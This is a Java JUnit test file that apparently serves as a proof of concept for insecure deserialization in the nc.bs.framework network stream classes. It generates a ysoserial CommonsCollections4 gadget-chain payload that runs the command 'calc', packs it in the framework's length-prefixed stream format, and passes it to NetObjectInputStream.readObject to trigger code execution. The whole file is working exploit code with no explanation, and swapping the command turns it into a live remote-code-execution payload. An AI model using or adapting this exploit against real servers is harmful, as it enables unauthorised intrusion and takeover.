package com.example;

import nc.bs.framework.comn.NetObjectInputStream;
import nc.bs.framework.comn.NetObjectOutputStream;
import nc.bs.framework.comn.NetStreamConstants;
import org.junit.Test;
import ysoserial.payloads.CommonsCollections4;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;

public class NetObjectSerialTest {
    @Test
    public static void test() throws Exception{
        String cmd = "calc";
        ObjectPayload<?> payload = CommonsCollections4.class.newInstance();
        Object obj = payload.getObject(cmd);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ByteArrayOutputStream temp = NetObjectOutputStream.convertObjectToBytes(obj, false, false);

        NetObjectOutputStream.writeInt(bos, temp.toByteArray().length);

        temp.writeTo(bos);

        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
        boolean[] streamRet = { NetStreamConstants.STREAM_NEED_COMPRESS, NetStreamConstants.STREAM_NEED_ENCRYPTED };

        NetObjectInputStream.readObject(bis, streamRet);
    }
}
